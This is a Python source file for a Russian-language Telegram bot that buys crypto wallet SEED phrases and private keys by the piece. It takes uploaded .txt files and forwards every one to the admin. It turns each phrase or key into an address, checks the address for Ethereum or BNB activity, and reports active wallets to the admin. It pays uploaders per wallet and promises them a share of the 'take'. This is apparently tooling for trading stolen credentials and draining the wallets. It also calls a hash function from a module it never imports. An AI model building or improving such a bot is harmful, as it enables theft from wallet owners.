# main.py
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

# Клавиатуры
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1:
        payload = args[1]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.replace("ref_", ""))
            except:
                pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id:
        await register_referral(message.from_user.id, referrer_id)

    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
    text = (
        "👋 <b>Добро пожаловать!</b>\n\n"
        "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
        "• <b>ERC-20 (Ethereum)</b>\n"
        "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "💰 <b>Цены:</b>\n"
        "• 🌱 SEED-фраза — <b>235₽</b>\n"
        "• 🔑 Private-key — <b>145₽</b>\n\n"
        "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
        "🔝 <b>Наши преимущества:</b>\n"
        "├ 🤖 Автоматизация\n"
        "├ ⚡ Быстрые выплаты\n"
        "├ 🚀 Высокая скорость\n"
        "└ 🔍 Глубокая проверка\n\n"
        "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>\n"
        "Все заработанные средства будут отправлены автоматически."
    )
    await message.answer(text, reply_markup=main_menu)

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
        "📌 Поддерживается до <b>20 МБ</b>.\n"
        "🔍 Проверка: уникальность + активность"
    )
    await state.set_state(UploadFile.waiting_file)
    await callback.answer()

@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    user_info = f"@{message.from_user.username}" if message.from_user.username else f"<code>{message.from_user.id}</code>"
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📩 <b>Новый файл на проверку</b>\n"
            f"👤 От: {user_info}\n"
            f"📄 Название: <code>{document.file_name}</code>\n"
            f"📦 Размер: {document.file_size} байт"
        )
        await bot.send_document(ADMIN_ID, document.file_id)
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Не удалось отправить файл: {e}")

    if not document.file_name.endswith(".txt"):
        await message.answer("❌ Файл должен быть в формате <b>.txt</b>.")
        await state.clear()
        return

    await message.answer("📥 Скачиваю файл... (до 20 МБ)")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("❌ Файл слишком большой. Максимум — 20 МБ.")
            await state.clear()
            return

        file_buffer = await bot.download_file(file.file_path)
        file_data = file_buffer.getvalue()

        if len(file_data) >= 100 and b'\x00' in file_data[:100]:
            await message.answer("❌ Это не текстовый файл.")
            await state.clear()
            return

        try:
            content = file_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = file_data.decode("cp1251")
            except UnicodeDecodeError:
                content = file_data.decode("utf-8", errors="replace")

    except Exception as e:
        await message.answer(f"❌ Ошибка при чтении файла: <code>{str(e)}</code>")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for line in lines:
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = database.hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True

        if is_valid:
            await bot.send_message(
                ADMIN_ID,
                f"✅ Активный кошелёк: <code>{address}</code>\n"
                f"📄 Тип: {wallet_type.upper()}\n"
                f"💰 +{price}₽"
            )

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, len(lines), new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"🎉 Реферал заработал {total_reward}₽\n💸 Вам +{bonus:.2f}₽")
            except: pass

    text = (
        f'✅ Файл <b>"{document.file_name}"</b> обработан!\n\n'
        f"📊 Уникальных активных:\n"
        f"   • SEED: <b>{new_seeds}</b> × 235₽\n"
        f"   • Keys: <b>{new_keys}</b> × 145₽\n\n"
        f"💰 Заработано: <b>{total_reward} RUB</b>"
    ) if total_reward > 0 else "❌ Нет подходящих уникальных активных кошельков."

    await message.answer(text, reply_markup=main_menu)
    await state.clear()

@dp.callback_query(F.data == "support")
async def support_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📞 <b>Служба поддержки</b>\n\n"
        "Отправьте ваше сообщение, и мы ответим в ближайшее время.\n"
        "Поддерживается: текст, фото, файлы, голосовые.",
        reply_markup=back_menu
    )
    await state.set_state(SupportState.waiting_for_message)
    await callback.answer()

@dp.message(SupportState.waiting_for_message)
async def send_to_admin(message: Message, state: FSMContext):
    user = message.from_user
    user_link = f'<a href="tg://user?id={user.id}">{user.full_name}</a>'
    await bot.send_message(
        ADMIN_ID,
        f"📩 <b>Сообщение от пользователя</b>\n"
        f"👤 {user_link} (ID: <code>{user.id}</code>)\n"
        f"📎 Тип: {message.content_type}",
        parse_mode="HTML"
    )
    await message.send_copy(chat_id=ADMIN_ID)
    await message.answer(
        "✅ Ваше сообщение отправлено в поддержку!\n"
        "Мы ответим в ближайшее время.",
        reply_markup=main_menu
    )
    await state.clear()

@dp.message(F.reply_to_message)
async def reply_to_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    replied = message.reply_to_message
    if not replied.text or "Сообщение от пользователя" not in replied.text:
        return
    try:
        lines = replied.text.split("\n")
        user_id_line = [line for line in lines if "ID:" in line][0]
        user_id = int(user_id_line.split("ID: ")[1].strip("``"))
    except:
        await message.answer("❌ Не удалось определить ID пользователя.")
        return
    try:
        await message.send_copy(chat_id=user_id)
        await message.answer(f"✅ Сообщение отправлено пользователю <code>{user_id}</code>.", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить сообщение: {e}")

@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    if not user:
        await callback.message.edit_text("❌ Ошибка.", reply_markup=back_menu)
        await callback.answer()
        return
    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"🆔 ID: <code>{user['user_id']}</code>\n"
        f"📝 Загружено строк: {user['total_lines']}\n"
        f"🌱 SEED: {user['unique_seeds']}\n"
        f"🔑 Keys: {user['unique_keys']}\n"
        f"💰 Заработано: {user['balance']:.2f} RUB\n\n"
        f"🕓 <b>Выплаты ежедневно в 23:00 (МСК)</b>"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "referrals")
async def referrals_cb(callback: CallbackQuery):
    ref_count = await get_referral_count(callback.from_user.id)
    earnings = await get_referral_earnings(callback.from_user.id)
    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{callback.from_user.id}"
    text = (
        f"👥 <b>Рефералы</b>\n\n"
        f"🔗 Ссылка: <code>{ref_link}</code>\n"
        f"👥 Приглашено: {ref_count}\n"
        f"💸 Заработано: {earnings:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "balance")
async def balance_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    bal = user['balance'] if user else 0
    await callback.message.edit_text(f"💰 Баланс: <b>{bal:.2f} RUB</b>", reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    text = (
        "📜 <b>Правила использования</b>\n\n"
        "1️⃣ <b>Формат файлов</b>\n"
        "Принимаются только <code>.txt</code> файлы.\n\n"
        "2️⃣ <b>Условия оплаты</b>\n"
        "Оплачиваются только <b>уникальные активные кошельки</b> с транзакциями в сетях:\n"
        "   • <b>ETH (Ethereum)</b>\n"
        "   • <b>BNB (Binance Smart Chain)</b>\n\n"
        "   💰 <b>Цены:</b>\n"
        "   • 🌱 SEED-фраза = <b>235₽</b>\n"
        "   • 🔑 Private-key = <b>145₽</b>\n\n"
        "   💸 <b>+70% от отработки</b> — сверху к базовой цене!\n\n"
        "3️⃣ <b>Запрещено</b>\n"
        "• Накрутка транзакций\n"
        "• Повторная отправка данных\n"
        "• Поддельные кошельки\n\n"
        "   ❌ Нарушение = <b>бан и блокировка выплат</b>\n\n"
        "4️⃣ <b>Выплаты</b>\n"
        "Все вознаграждения выплачиваются <b>ежедневно в 23:00 (МСК)</b>."
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery):
    await callback.message.edit_text("Главное меню:", reply_markup=main_menu)
    await callback.answer()

@dp.message(F.text == "/stats")
async def stats_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    stats = await get_stats()
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: {stats['users']}\n"
        f"📈 Строк: {stats['lines']}\n"
        f"🌱 SEED: {stats['seeds']}\n"
        f"🔑 Keys: {stats['keys']}\n"
        f"💸 Выплачено: {stats['payout']:.2f} RUB"
    )
    await message.answer(text)

async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())